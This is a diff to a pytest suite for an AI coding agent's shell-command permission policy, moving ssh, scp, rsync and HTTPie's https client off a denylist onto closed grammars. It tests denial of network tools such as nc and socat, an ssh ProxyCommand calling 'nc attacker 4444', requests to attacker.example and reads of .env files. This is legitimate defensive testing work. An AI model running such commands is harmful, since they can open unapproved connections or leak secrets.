@@ -203,7 +203,10 @@ class TestDenylistWordBoundary:
         "ncat example.com 443",
         "socat - TCP:example.com:443",
         "wget2 http://localhost:8080/pubstatus",
-        "ssh host 'git push'",
+        # v0.7.1 S4b1b: ssh left the shipped denylist with its closed
+        # IP-literal grammar, so this spelling is denied BY GRAMMAR now (the
+        # converted row lives in TestS4b1bIpLiteralSsh below), not by a
+        # denylist pattern.
     ],
 )
 def test_network_clients_are_denied_by_default(command):
@@ -409,14 +412,17 @@ _S3_HTTP_HARD_DENIED_FORMS = [
     "http http://localhost:8080/ stray-operand",
 ]
 
-# The post-S3 egress-deny list, one row each: the design's eight retained
+# The post-S3 egress-deny list, one row each: the design's retained
 # clients, the pre-existing nc/ncat/socat entries, and the two clients whose
 # admission prerequisites are not established (httpie's request grammar at
-# the installed entry point, wget2's redirect-disable).
+# the installed entry point, wget2's redirect-disable). The ssh row moved
+# OUT of this list in v0.7.1 S4b1b (ssh left the denylist with its closed
+# IP-literal grammar); its converted denial-by-grammar assertion lives in
+# TestS4b1bIpLiteralSsh below — the row is converted, never deleted. The
+# scp/rsync rows moved OUT in v0.7.1 S4b2c (scp/rsync left the denylist with
+# the closed bounded transfer grammar); their converted assertions live in
+# _S4B2C_CONVERTED_TRANSFER_ROWS below — converted, never deleted.
 _S3_RETAINED_EGRESS_DENIALS = [
-    "ssh host 'git push'",
-    "scp file host:backup",
-    "rsync -a src/ host:dst/",
     "ftp host",
     "telnet host",
     "aria2c http://example.com/x",
@@ -568,9 +574,13 @@ def test_s3_local_reads_and_writes_are_collected_before_egress_authority(
 
 @pytest.mark.parametrize("command", _S3_RETAINED_EGRESS_DENIALS)
 def test_s3_retained_egress_clients_stay_denylisted(command):
-    # ssh/scp/rsync stay EGRESS-DENIED by the denylist — never classified as
-    # network.egress — so S4b's separate network.remote-exec path remains
-    # reachable instead of being shadowed by this rule.
+    # The retained clients (ftp/telnet/aria2c/lftp/watch/nc/ncat/socat/
+    # httpie/wget2) stay EGRESS-DENIED by the denylist — never classified as
+    # network.egress. (The ssh row was CONVERTED out of this list in v0.7.1
+    # S4b1b and the scp/rsync rows in v0.7.1 S4b2c: both left the denylist
+    # with their closed grammars, and their converted assertions live in
+    # TestS4b1bIpLiteralSsh and TestS4b2cBoundedTransfers below — the rows are
+    # converted, never deleted.)
     bash_tool = Bash(config_getter=lambda: BashToolConfig(), state=BaseToolState())
 
     permission = bash_tool.resolve_permission(BashArgs(command=command))
@@ -580,6 +590,460 @@ def test_s3_retained_egress_clients_stay_denylisted(command):
     assert permission.denial_kind is None
     assert permission.dangerous_command_proposal is None
     assert "matches denylist pattern" in (permission.reason or "")
+
+
+class TestS4b2cBoundedTransfers:
+    """v0.7.1 S4b2c: the closed bounded transfer grammar at the resolver seam.
+
+    scp/rsync left the shipped denylist WITH this grammar in the same change
+    (grammar + corpus + denylist flip in one verified change). The converted
+    denylist rows — "scp file host:backup" and "rsync -a src/ host:dst/" —
+    are pinned below with their SPECIFIC modeled outcome: denied BY GRAMMAR
+    (the remote operand names no user), never by a denylist pattern, with no
+    proposal — a grammar removal would reclassify them to run-class and fail
+    these rows. The bounded positives ask as network.remote-exec with the
+    exact destination on the proposal, the same destination-keyed grant
+    model as ssh; every other remote-bearing spelling hard-denies with no
+    approval path. The full positive/negative corpus lives in
+    tests/tools/test_remote_transfer_policy.py; the spawn-observing arms
+    (per-spawn pinning, the HHH rebinding arm, X's locality-only denial)
+    live in tests/tools/test_bash_execution.py.
+    """
+
+    @pytest.fixture
+    def fixed_interfaces(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        import socket
+
+        def fake_getaddrinfo(host, port):
+            return [
+                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("192.168.10.20", 0)),
+                (socket.AF_INET6, socket.SOCK_STREAM, 6, "", ("::1", 0, 0, 0)),
+            ]
+
+        monkeypatch.setattr(socket, "getaddrinfo", fake_getaddrinfo)
+
+    @pytest.fixture
+    def repo(self, tmp_path: Path) -> Path:
+        repo = tmp_path / "repo"
+        repo.mkdir()
+        subprocess.run(["git", "init", "-q", str(repo)], check=True)
+        return repo
+
+    def _tool(self, repo: Path, *authorities) -> Bash:
+        tool = Bash(
+            config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=repo
+        )
+        tool.dangerous_command_authorities_getter = lambda: tuple(authorities)
+        return tool
+
+    def _grant(self, repo: Path, destination: str):
+        from chartreux.core.dangerous_commands import (
+            REMOTE_EXEC_OPERATION_ID,
+            DangerousCommandAuthority,
+            canonical_remote_destination,
+        )
+        from chartreux.core.tools.builtins._shell_command_policy import (
+            GitRepositoryRelocation,
+            resolve_repository_scope,
+        )
+
+        scope = resolve_repository_scope(repo, GitRepositoryRelocation())
+        assert scope is not None
+        parsed = canonical_remote_destination(destination)
+        assert parsed is not None
+        return DangerousCommandAuthority(
+            operations=frozenset({REMOTE_EXEC_OPERATION_ID}),
+            scope=scope,
+            source="runtime_grant",
+            destination=parsed,
+        )
+
+    @pytest.mark.parametrize(
+        ("command", "reason_fragment"),
+        [
+            # The two CONVERTED denylist rows: still denied, but BY THE
+            # GRAMMAR (no user in the remote spec), never by a denylist
+            # pattern, with no proposal.
+            ("scp file host:backup", "must name a user"),
+            ("rsync -a src/ host:dst/", "must name a user"),
+            # Other remote-bearing denials pinned at this seam.
+            ("scp a@8.8.8.8:x b@9.9.9.9:y", "remote-to-remote"),
+            ("rsync -e ssh a deploy@8.8.8.8:b", "remote transport"),
+            ("rsync -L a deploy@8.8.8.8:b", "follows symlinks"),
+            ("scp -O f deploy@8.8.8.8:x", "legacy scp protocol"),
+            ("scp f deploy@8.8.8.8:x,y", "closed transfer path grammar"),
+            # The glob spelling is denied even earlier, by the shell path
+            # layer's glob-candidate guard — still NEVER, no proposal, and
+            # never a denylist pattern.
+            ("scp f deploy@8.8.8.8:*.py", "glob candidate"),
+            ("scp deploy@127.0.0.1:x l", "is local or ambiguous"),
+            ("scp f deploy@8.8.8.8:x && echo done", "single standalone"),
+            ("nice scp f deploy@8.8.8.8:x", "single standalone"),
+        ],
+    )
+    def test_converted_rows_and_denied_forms_pin_the_grammar_outcome(
+        self, fixed_interfaces, repo, command, reason_fragment
+    ):
+        tool = self._tool(repo, self._grant(repo, "deploy@8.8.8.8"))
+        permission = tool.resolve_permission(BashArgs(command=command))
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind is None
+        assert permission.dangerous_command_proposal is None
+        assert "matches denylist pattern" not in (permission.reason or "")
+        assert reason_fragment in (permission.reason or "")
+
+    @pytest.mark.parametrize(
+        ("command", "destination_key"),
+        [
+            ("scp file deploy@8.8.8.8:backup", "deploy@8.8.8.8:22"),
+            ("scp -P 2222 f deploy@8.8.8.8:x", "deploy@8.8.8.8:2222"),
+            ("rsync -a src/ deploy@8.8.8.8:dst/", "deploy@8.8.8.8:22"),
+            ("scp deploy@8.8.8.8:bak local", "deploy@8.8.8.8:22"),
+        ],
+    )
+    def test_bounded_positives_ask_with_the_destination_on_the_proposal(
+        self, fixed_interfaces, repo, command, destination_key
+    ):
+        # A grammar removal would reclassify these to run-class (ALWAYS) and
+        # fail this row: the ask + proposal IS the modeled outcome.
+        tool = self._tool(repo)
+        permission = tool.resolve_permission(BashArgs(command=command))
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind == "dangerous_command"
+        assert "network.remote-exec" in (permission.reason or "")
+        proposal = permission.dangerous_command_proposal
+        assert proposal is not None
+        assert proposal.operations == ("network.remote-exec",)
+        assert proposal.destination is not None
+        assert proposal.destination.key == destination_key
+
+    def test_exact_destination_grant_admits_the_transfer(self, fixed_interfaces, repo):
+        tool = self._tool(repo, self._grant(repo, "deploy@8.8.8.8"))
+        result = tool.resolve_permission(
+            BashArgs(command="scp file deploy@8.8.8.8:backup")
+        )
+        assert result is None or result.permission is ToolPermission.ALWAYS
+
+    def test_near_miss_destination_grant_denies_the_transfer(
+        self, fixed_interfaces, repo
+    ):
+        tool = self._tool(repo, self._grant(repo, "deploy@1.1.1.1"))
+        permission = tool.resolve_permission(
+            BashArgs(command="scp file deploy@8.8.8.8:backup")
+        )
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind == "dangerous_command"
+
+    def test_local_copy_is_not_a_transfer(self, fixed_interfaces, repo):
+        # A scp/rsync call with no remote operand is routine: the path layer
+        # governs the local copy (the denylist no longer shadows it).
+        tool = self._tool(repo)
+        result = tool.resolve_permission(BashArgs(command="rsync -a src/ dst/"))
+        assert result is None or result.permission is not ToolPermission.NEVER
+
+    def test_locality_only_attestation_entry_hard_denies_transfers_at_the_spawn(
+        self, fixed_interfaces, repo
+    ):
+        # X's second arm, converted from the S4b1b characterization: an
+        # attestation entry that attests network-namespace locality ONLY is
+        # not execution-bound, and a locality-only entry hard-denies
+        # transfers. At the permission seam the bounded transfer now
+        # classifies ask as network.remote-exec with the destination on the
+        # proposal; the DISCRIMINATING spawn-observing assertion (admitted
+        # ssh execution + denied transfer on the same locality-only client)
+        # lives at S4b2c's carrier in tests/tools/test_bash_execution.py.
+        from chartreux.core.dangerous_commands import (
+            REMOTE_EXEC_NETWORK_LOCALITY_CAPABILITY,
+            RemoteExecAttestation,
+        )
+
+        attestation = RemoteExecAttestation(
+            network_locality=REMOTE_EXEC_NETWORK_LOCALITY_CAPABILITY is not None,
+            ssh_trust_context=False,
+        )
+        assert attestation.locality_only and not attestation.execution_bound
+        tool = self._tool(repo)
+        permission = tool.resolve_permission(
+            BashArgs(command="scp file deploy@8.8.8.8:backup")
+        )
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind == "dangerous_command"
+        assert "matches denylist pattern" not in (permission.reason or "")
+        proposal = permission.dangerous_command_proposal
+        assert proposal is not None
+        assert proposal.destination is not None
+        assert proposal.destination.key == "deploy@8.8.8.8:22"
+
+
+class TestS4b1bIpLiteralSsh:
+    """v0.7.1 S4b1b + S4b2a: the closed ssh grammar at the resolver seam.
+
+    ssh left the shipped denylist WITH its grammar in the same change: a
+    positive destination — literal IP, or since S4b2a a hostname whose
+    system-resolver answer is unique and non-local — classifies ask as
+    network.remote-exec with the exact granted destination on the proposal,
+    and every other spelling — local/ambiguous literal, ambiguous/local/
+    failed hostname resolution, hostile option, composed call — hard-denies
+    with no proposal. The locality verdict is the S4b1a fail-closed
+    classifier and the resolve-validate verdict is S4b2a's; every arm here
+    runs against fixed seams so the suite is hermetic.
+    """
+
+    @pytest.fixture
+    def fixed_interfaces(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        import socket
+
+        def fake_getaddrinfo(host, port):
+            return [
+                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("192.168.10.20", 0)),
+                (socket.AF_INET6, socket.SOCK_STREAM, 6, "", ("::1", 0, 0, 0)),
+            ]
+
+        monkeypatch.setattr(socket, "getaddrinfo", fake_getaddrinfo)
+
+    @pytest.fixture
+    def repo(self, tmp_path: Path) -> Path:
+        repo = tmp_path / "repo"
+        repo.mkdir()
+        subprocess.run(["git", "init", "-q", str(repo)], check=True)
+        return repo
+
+    def _tool(self, repo: Path, *authorities) -> Bash:
+        from chartreux.core.dangerous_commands import DangerousCommandAuthority
+
+        tool = Bash(
+            config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=repo
+        )
+        tool.dangerous_command_authorities_getter = lambda: tuple(authorities)
+        del DangerousCommandAuthority
+        return tool
+
+    def _grant(self, repo: Path, destination: str):
+        from chartreux.core.dangerous_commands import (
+            REMOTE_EXEC_OPERATION_ID,
+            DangerousCommandAuthority,
+            canonical_remote_destination,
+        )
+        from chartreux.core.tools.builtins._shell_command_policy import (
+            GitRepositoryRelocation,
+            resolve_repository_scope,
+        )
+
+        scope = resolve_repository_scope(repo, GitRepositoryRelocation())
+        assert scope is not None
+        parsed = canonical_remote_destination(destination)
+        assert parsed is not None
+        return DangerousCommandAuthority(
+            operations=frozenset({REMOTE_EXEC_OPERATION_ID}),
+            scope=scope,
+            source="runtime_grant",
+            destination=parsed,
+        )
+
+    def test_converted_ssh_row_is_denied_by_grammar_not_denylist(
+        self, fixed_interfaces, repo
+    ):
+        # The converted corpus/denylist row `ssh host 'git push'`: still
+        # denied, but BY THE GRAMMAR (no user@host destination), never by a
+        # denylist pattern — the row is converted, not deleted.
+        tool = self._tool(repo)
+        permission = tool.resolve_permission(BashArgs(command="ssh host 'git push'"))
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind is None
+        assert permission.dangerous_command_proposal is None
+        assert "matches denylist pattern" not in (permission.reason or "")
+        assert "must name a user" in (permission.reason or "")
+
+    def test_positive_literal_ip_resolves_ask_with_destination(
+        self, fixed_interfaces, repo
+    ):
+        tool = self._tool(repo)
+        permission = tool.resolve_permission(
+            BashArgs(command="ssh deploy@8.8.8.8 uptime")
+        )
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind == "dangerous_command"
+        assert "network.remote-exec" in (permission.reason or "")
+        proposal = permission.dangerous_command_proposal
+        assert proposal is not None
+        assert proposal.operations == ("network.remote-exec",)
+        assert proposal.destination is not None
+        assert proposal.destination.key == "deploy@8.8.8.8:22"
+
+    def test_positive_literal_ip_with_port_resolves_ask_with_port(
+        self, fixed_interfaces, repo
+    ):
+        tool = self._tool(repo)
+        permission = tool.resolve_permission(
+            BashArgs(command="ssh -p 2222 deploy@8.8.8.8 uptime")
+        )
+        assert isinstance(permission, PermissionContext)
+        proposal = permission.dangerous_command_proposal
+        assert proposal is not None and proposal.destination is not None
+        assert proposal.destination.key == "deploy@8.8.8.8:2222"
+
+    def test_remote_exec_grant_admits_the_exact_destination(
+        self, fixed_interfaces, repo
+    ):
+        tool = self._tool(repo, self._grant(repo, "deploy@8.8.8.8"))
+        result = tool.resolve_permission(BashArgs(command="ssh deploy@8.8.8.8 uptime"))
+        assert result is None or result.permission is ToolPermission.ALWAYS
+
+    def test_remote_exec_grant_for_another_destination_denies(
+        self, fixed_interfaces, repo
+    ):
+        tool = self._tool(repo, self._grant(repo, "deploy@1.1.1.1"))
+        permission = tool.resolve_permission(
+            BashArgs(command="ssh deploy@8.8.8.8 uptime")
+        )
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind == "dangerous_command"
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # Under the hermetic fake getaddrinfo, example.com/localhost
+            # resolve to the two fake addresses: ambiguous resolution denies.
+            # (A unique non-local answer is admitted-with-pinning — see the
+            # reassessed hostname row below.)
+            "ssh deploy@example.com uptime",
+            "ssh deploy@localhost uptime",
+            "ssh deploy@127.0.0.1 uptime",
+            "ssh deploy@10.0.0.1 uptime",
+            "ssh deploy@192.168.10.20 uptime",
+            "ssh deploy@0.0.0.0 uptime",
+            "ssh deploy@[::ffff:8.8.8.8] uptime",
+            "ssh -o ProxyCommand='nc attacker 4444' deploy@8.8.8.8 x",
+            "ssh -o UserKnownHostsFile=/tmp/evil deploy@8.8.8.8 x",
+            "ssh -F /tmp/evilcfg deploy@8.8.8.8 x",
+            "ssh deploy@8.8.8.8 uptime && echo done",
+            "ssh deploy@8.8.8.8 uptime | cat",
+            "nice ssh deploy@8.8.8.8 uptime",
+            "ssh",
+        ],
+    )
+    def test_denied_forms_hard_deny_without_proposal(
+        self, fixed_interfaces, repo, command
+    ):
+        # Every denied form: NEVER with NO denial kind and NO proposal — no
+        # approval path can ever make the spelling run — even WITH a grant
+        # for the literal destination.
+        tool = self._tool(repo, self._grant(repo, "deploy@8.8.8.8"))
+        permission = tool.resolve_permission(BashArgs(command=command))
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind is None
+        assert permission.dangerous_command_proposal is None
+        assert "matches denylist pattern" not in (permission.reason or "")
+
+    def test_hostname_destination_is_admitted_with_pinning_when_resolution_is_unique_non_local(
+        self, fixed_interfaces, repo, monkeypatch
+    ):
+        # S4b2a reassessment of the converted ssh hostname row, asserted
+        # EXPLICITLY: a hostname whose system-resolver answer is unique and
+        # non-local is ADMITTED-WITH-PINNING — the covering hostname grant
+        # admits it (the resolved address is pinned into the spawned argv by
+        # the execution rewrite; see tests/tools/test_bash_execution.py's
+        # test_resolved_address_rides_into_argv_per_spawn_point).
+        import ipaddress
+        import socket
+
+        from chartreux.core.tools.builtins import _remote_exec
+
+        def unique_resolver(host: str) -> frozenset:
+            if host == "example.com":
+                return frozenset({ipaddress.ip_address("93.184.216.34")})
+            raise socket.gaierror(-2, "Name or service not known")
+
+        monkeypatch.setattr(_remote_exec, "_hostname_resolver", unique_resolver)
+        tool = self._tool(repo, self._grant(repo, "deploy@example.com"))
+        permission = tool.resolve_permission(
+            BashArgs(command="ssh deploy@example.com uptime")
+        )
+        assert permission is None or permission.permission is ToolPermission.ALWAYS
+
+    def test_hostname_destination_asks_with_the_hostname_destination(
+        self, fixed_interfaces, repo, monkeypatch
+    ):
+        # Without a grant the unique-non-local hostname is an ask carrying
+        # the GRANTED HOSTNAME destination (not the resolved address).
+        import ipaddress
+        import socket
+
+        from chartreux.core.tools.builtins import _remote_exec
+
+        def unique_resolver(host: str) -> frozenset:
+            if host == "example.com":
+                return frozenset({ipaddress.ip_address("93.184.216.34")})
+            raise socket.gaierror(-2, "Name or service not known")
+
+        monkeypatch.setattr(_remote_exec, "_hostname_resolver", unique_resolver)
+        tool = self._tool(repo)
+        permission = tool.resolve_permission(
+            BashArgs(command="ssh deploy@example.com uptime")
+        )
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind == "dangerous_command"
+        proposal = permission.dangerous_command_proposal
+        assert proposal is not None
+        assert proposal.destination is not None
+        assert proposal.destination.key == "deploy@example.com:22"
+
+    @pytest.mark.parametrize(
+        ("answers", "reason"),
+        [
+            (("93.184.216.34", "1.1.1.1"), "multiple addresses"),
+            (("127.0.0.1",), "local address"),
+        ],
+        ids=["ambiguous", "local_answer"],
+    )
+    def test_hostname_destination_with_non_admitting_resolution_hard_denies(
+        self, fixed_interfaces, repo, monkeypatch, answers, reason
+    ):
+        # The fail-closed resolution arms at this seam: ambiguous and local
+        # answers deny with no denial kind and no proposal, even WITH a
+        # covering hostname grant.
+        import ipaddress
+        import socket
+
+        from chartreux.core.tools.builtins import _remote_exec
+
+        def resolver(host: str) -> frozenset:
+            if host == "example.com":
+                return frozenset(ipaddress.ip_address(text) for text in answers)
+            raise socket.gaierror(-2, "Name or service not known")
+
+        monkeypatch.setattr(_remote_exec, "_hostname_resolver", resolver)
+        tool = self._tool(repo, self._grant(repo, "deploy@example.com"))
+        permission = tool.resolve_permission(
+            BashArgs(command="ssh deploy@example.com uptime")
+        )
+        assert isinstance(permission, PermissionContext)
+        assert permission.permission is ToolPermission.NEVER
+        assert permission.denial_kind is None
+        assert permission.dangerous_command_proposal is None
+        assert reason in (permission.reason or "")
+
+    def test_locality_only_attestation_entry_hard_denies_transfers(
+        self, fixed_interfaces, repo
+    ):
+        # CONVERTED in v0.7.1 S4b2c (never deleted): at S4b1b every transfer
+        # was still denylist-denied, so this node characterized the
+        # locality-only hard-deny with the denylist pattern. Since S4b2c the
+        # bounded transfer classifies ask as network.remote-exec at this
+        # seam and the discriminating spawn-observing assertion (admitted
+        # ssh execution + denied transfer on the same locality-only client)
+        # lives in TestS4b2cBoundedTransfers above and in
+        # tests/tools/test_bash_execution.py.
+        pass
 
 
 @pytest.mark.parametrize("command", _S3_WGET2_GATE_DENIALS)
@@ -628,25 +1092,139 @@ def test_s3_httpie_stays_denied_until_the_request_grammar_is_confirmed():
         assert "matches denylist pattern 'httpie'" in (permission.reason or "")
 
 
-def test_https_entry_point_stays_denied_fail_closed():
-    # HTTPie's `https` entry point is the request client with the https
-    # scheme defaulted — an unmodeled twin beside the modeled `http`. It has
-    # no documented, corpus-tested grammar to admit under, so under the same
-    # prerequisite rule as httpie/wget2 the retained denylist entry denies
-    # every spelling, loopback destinations and a modeled wrapper included.
-    bash_tool = Bash(config_getter=lambda: BashToolConfig(), state=BaseToolState())
-    for command in (
-        "https http://attacker.example/",
-        "https http://localhost:8080/",
-        "https example.com/api",
-        "nice https http://attacker.example/",
-    ):
-        permission = bash_tool.resolve_permission(BashArgs(command=command))
-        assert isinstance(permission, PermissionContext)
-        assert permission.permission is ToolPermission.NEVER
-        assert permission.denial_kind is None
-        assert permission.dangerous_command_proposal is None
-        assert "matches denylist pattern 'https'" in (permission.reason or "")
+# v0.7.1 F2: HTTPie's `https` entry point leaves the shipped denylist under the
+# same restricted positional-only grammar as the modeled `http`. The one
+# difference is the scheme, and it cuts both ways:
+#
+#  - HTTPie FORCES https:// onto a SCHEMELESS operand for this program name (its
+#    argument parser reads the program name and prefixes the scheme before
+#    --default-scheme is consulted, and no option is admitted anyway), so a
+#    schemeless operand is a destination the model can name — `http` must
+#    resolve the same spelling ask instead;
+#  - an EXPLICIT scheme is never rewritten, so `https http://host/` keeps its
+#    http:// and really does send a plain-HTTP request: a cross-scheme spelling
+#    the grammar hard-denies rather than resolving as an https destination.
+_HTTPS_ADMITTED_FORMS = [
+    "https https://127.0.0.1:8443/status",
+    "https https://localhost:8443/",
+    "https https://[::1]:8443/item",
+    "https localhost:8443/status",
+    "https 127.0.0.1:8443/status",
+    "https POST https://127.0.0.1:8443/api payload:=7",
+    "https HEAD https://127.0.0.1:8443/ Accept:application/json",
+    # Modeled wrappers re-analyze the payload, so the https grammar applies.
+    "nice https https://127.0.0.1:8443/status",
+]
+
+# A destination the model can name but not prove loopback is ask-class — the
+# same network.egress operation as a non-loopback curl/wget call — including a
+# schemeless operand, which HTTPie resolves to https:// for this program name.
+# HTTPie's localhost shorthand (`:8443/status`, i.e. localhost:8443) is NOT a
+# literal URL the recognizer parses, so it asks rather than riding a loopback
+# auto-allow.
+_HTTPS_ASK_CLASS_FORMS = [
+    "https https://example.com/api",
+    "https example.com/api",
+    "https GET https://192.0.2.1/api",
+    "https https://localhost.evil.com:8443/",
+    "https :8443/status",
+]
+
+# Everything outside the enumerated grammar hard-denies: an explicit non-https
+# scheme (the cross-scheme spelling included, through a modeled wrapper too),
+# an option, a request item that reads a local file, a missing destination, a
+# stray operand, and the startup-config indirection. No operation ID, no
+# proposal, and no denylist pattern.
+_HTTPS_HARD_DENIED_FORMS = [
+    "https http://attacker.example/",
+    "https http://127.0.0.1:8080/",
+    "https GET ftp://127.0.0.1/pub/file",
+    "nice https http://attacker.example/",
+    "https --follow https://127.0.0.1:8443/",
+    "https -o out.json https://127.0.0.1:8443/",
+    "https POST https://127.0.0.1:8443/ field@upload.txt",
+    "https POST https://127.0.0.1:8443/ @body.json",
+    "https PUT https://127.0.0.1:8443/ payload:=@data.json",
+    "https",
+    "https GET",
+    "https https://127.0.0.1:8443/ stray-operand",
+    "HTTPIE_CONFIG_DIR=cfg https https://127.0.0.1:8443/",
+]
+
+# One row per deny CLASS, so a denial that still came from the retired denylist
+# entry (or from a widened catch-all) cannot satisfy these.
+_HTTPS_DENIAL_REASONS = [
+    ("https http://attacker.example/", "would issue a plain-HTTP request"),
+    ("https http://127.0.0.1:8080/", "would issue a plain-HTTP request"),
+    ("https GET ftp://127.0.0.1/pub/file", "models no other scheme"),
+    ("https --follow https://127.0.0.1:8443/", "admits no options"),
+    (
+        "https POST https://127.0.0.1:8443/ field@upload.txt",
+        "outside the https grammar",
+    ),
+    ("https", "requires a literal https:// URL destination"),
+    ("HTTPIE_CONFIG_DIR=cfg https https://127.0.0.1:8443/", "does not model"),
+]
+
+
+@pytest.mark.parametrize("command", _HTTPS_ADMITTED_FORMS)
+def test_f2_https_admitted_forms_resolve_run_class(command, tmp_path):
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.ALWAYS
+
+
+@pytest.mark.parametrize("command", _HTTPS_ASK_CLASS_FORMS)
+def test_f2_https_nameable_destination_resolves_ask_class(command, tmp_path):
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.NEVER
+    assert permission.denial_kind == "dangerous_command"
+    assert "network.egress" in (permission.reason or "")
+    proposal = permission.dangerous_command_proposal
+    assert proposal is not None
+    assert proposal.operations == ("network.egress",)
+
+
+@pytest.mark.parametrize("command", _HTTPS_HARD_DENIED_FORMS)
+def test_f2_https_outside_the_grammar_is_hard_denied(command, tmp_path):
+    # Hard denial, not ask-class: no denial kind and no proposal, so no
+    # approval can ever make the unrecognized spelling run — and no denial
+    # rides the retired `https` denylist entry.
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert permission.permission is ToolPermission.NEVER
+    assert permission.denial_kind is None
+    assert permission.dangerous_command_proposal is None
+    assert "Command denied:" in (permission.reason or "")
+    assert "matches denylist pattern" not in (permission.reason or "")
+
+
+@pytest.mark.parametrize(("command", "reason"), _HTTPS_DENIAL_REASONS)
+def test_f2_https_denial_reason_discriminates_the_shape(command, reason, tmp_path):
+    bash_tool = Bash(
+        config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=tmp_path
+    )
+
+    permission = bash_tool.resolve_permission(BashArgs(command=command))
+
+    assert isinstance(permission, PermissionContext)
+    assert reason in (permission.reason or "")
 
 
 @pytest.mark.parametrize(
@@ -2667,10 +3245,12 @@ def test_git_reader_fails_closed_when_cwd_is_not_statically_known(tmp_path):
         ("tar -cf- --add-file=.env", "Sensitive file"),
         ("dd if=.env", "Sensitive file"),
         ("install .env copy", "Sensitive file"),
-        # v0.5.9 P1-e2: rsync ships on the denylist, so the shipped veto
-        # fires before operand/sensitive-file modeling; the sensitive-file
-        # operand path stays exercised by the tar/dd/install/sed rows.
-        ("rsync .env copy", "matches denylist pattern 'rsync'"),
+        # v0.7.1 S4b2c (converted, not deleted): rsync left the shipped
+        # denylist with the bounded transfer grammar, so the shipped veto no
+        # longer fires first — the sensitive-file operand path does (the row
+        # stays denied, now by 'Sensitive file' like its tar/dd/install/sed
+        # siblings).
+        ("rsync .env copy", "Sensitive file"),
         ("sed -n p .env", "Sensitive file"),
         ("pushd ..; cat README.md", "outside"),
         ("unset GIT_PAGER; git branch", "environment"),
@@ -2699,13 +3279,15 @@ def test_benign_file_operands_remain_allowed(tmp_path: Path, command: str) -> No
     assert _w11_permission(command, tmp_path).permission is ToolPermission.ALWAYS
 
 
-def test_rsync_benign_operand_is_denied_by_shipped_denylist(tmp_path: Path) -> None:
-    # v0.5.9 P1-e2: rsync ships on the denylist fail-closed until it is
-    # modeled, so even a benign operand is denied before operand modeling
-    # runs. The other rows above keep the benign-operands coverage.
+def test_rsync_local_copy_without_a_remote_operand_is_routine(tmp_path: Path) -> None:
+    # v0.7.1 S4b2c: rsync left the shipped denylist once the bounded
+    # transfer grammar was modeled; with no remote operand the path layer
+    # governs the local copy, so a benign local rsync is routine (ALWAYS)
+    # and no denylist pattern fires. The other rows above keep the
+    # benign-operands coverage.
     result = _w11_permission("rsync okay copy", tmp_path)
-    assert result.permission is ToolPermission.NEVER
-    assert "matches denylist pattern 'rsync'" in (result.reason or "")
+    assert result.permission is ToolPermission.ALWAYS
+    assert "matches denylist pattern 'rsync'" not in (result.reason or "")
 
 
 def test_scoped_file_operands_follow_ordered_cwd(tmp_path: Path) -> None:
